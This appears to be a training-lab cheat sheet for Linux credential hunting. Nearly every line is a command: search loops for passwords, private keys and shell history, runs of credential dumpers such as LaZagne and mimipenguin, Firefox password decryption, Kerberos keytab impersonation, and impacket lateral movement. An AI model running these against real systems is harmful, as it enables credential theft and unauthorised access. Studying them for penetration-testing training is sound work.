# Credentials Hunting

| Command                                                                                                                                                                                               | Description                                                                                                               |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \\| grep -v "lib\\|fonts\\|share\\|core" ;done`                                               | Script that can be used to find .conf, .config and .cnf files on a Linux system.                                          |
| `for i in $(find / -name *.cnf 2>/dev/null \\| grep -v "doc\\|lib");do echo -e "\nFile: " $i; grep "user\\|password\\|pass" $i 2>/dev/null \\| grep -v "\#";done`                                     | Script that can be used to find credentials in specified file types.                                                      |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \\| grep -v "doc\\|lib\\|headers\\|share\\|man";done`                                      | Script that can be used to find common database files.                                                                    |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`                                                                                                                                                 | Uses Linux-based find command to search for text files.                                                                   |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \\| grep -v "doc\\|lib\\|headers\\|share";done`                                     | Script that can be used to search for common file types used with scripts.                                                |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \\| grep -v "lib\\|fonts\\|share\\|core" ;done` | Script used to look for common types of documents.                                                                        |
| `cat /etc/crontab`                                                                                                                                                                                    | Uses Linux-based cat command to view the contents of crontab in search for credentials.                                   |
| `ls -la /etc/cron.*/`                                                                                                                                                                                 | Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory.                  |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \\| grep ":1"`                                                                                                                                                | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys.                 |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \\| grep ":1"`                                                                                                                                           | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user’s home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \\| grep ":1"`                                                                                                                                               | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user’s home directory.         |
| `tail -n5 /home/*/.bash*`                                                                                                                                                                             | Uses Linux-based tail command to search the through bash history files and output the last 5 lines.                       |
| `python3 mimipenguin.py`                                                                                                                                                                              | Runs Mimipenguin.py using python3.                                                                                        |
| `bash mimipenguin.sh`                                                                                                                                                                                 | Runs Mimipenguin.sh using bash.                                                                                           |
| `python2.7 lazagne.py all`                                                                                                                                                                            | Runs Lazagne.py with all modules using python2.7                                                                          |
| `ls -l .mozilla/firefox/ \\| grep default`                                                                                                                                                            | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep.  |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \\| jq .`                                                                                                                                  | Uses Linux-based command cat to search for credentials stored by Firefox in JSON.                                         |
| `python3.9 firefox_decrypt.py`                                                                                                                                                                        | Runs Firefox\_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.        |
| `python3 lazagne.py browsers`                                                                                                                                                                         | Runs Lazagne.py browsers module using Python 3.                                                                           |
| `realm list`                                                                                                                                                                                          | **realm - Check If Linux Machine is Domain Joined**                                                                       |
| `ps -ef \| grep -i "winbind\\|sssd"`                                                                                                                                                                  | **PS - Check if Linux Machine is Domain Joined**                                                                          |
| `find / -name *keytab* -ls`` `**`2`**`>/dev/null`                                                                                                                                                     | **Using Find to Search for Files with Keytab in the Name**                                                                |
| `crontab -l`                                                                                                                                                                                          | **Identifying Keytab Files in Cronjobs**                                                                                  |
| `env \| grep -i krb5`                                                                                                                                                                                 | **Reviewing Environment Variables for ccache Files.**                                                                     |
| `ls -la /tmp`                                                                                                                                                                                         | **Searching for ccache Files in /tmp**                                                                                    |
| `klist -k -t`                                                                                                                                                                                         | **Listing keytab File Information**                                                                                       |
| `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`                                                                                                                                | **Impersonating a User with a keytab**                                                                                    |
| `smbclient //dc01/carlos -k -c ls`                                                                                                                                                                    | **Connecting to SMB Share as Carlos**                                                                                     |
| `python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab`                                                                                                                                       | **Extracting Keytab Hashes with KeyTabExtract**                                                                           |
| `su - carlos@toto.com`                                                                                                                                                                                | **Log in as Carlos**                                                                                                      |
| `export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133`                                                                                                                                         |                                                                                                                           |
| `proxychains impacket-wmiexec ms01 -k`                                                                                                                                                                |                                                                                                                           |
| `impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`                                                                                                                                        | **Impacket Ticket Converter**                                                                                             |
|                                                                                                                                                                                                       |                                                                                                                           |

## Hash Algorithm



| **ID**   | **Cryptographic Hash Algorithm**                                      |
| -------- | --------------------------------------------------------------------- |
| `$1$`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `$2a$`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish\_\(cipher\))        |
| `$5$`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$6$`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$sha1$` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `$y$`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `$gy$`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `$7$`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

## Logs



| Log                   | Description                                        |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |
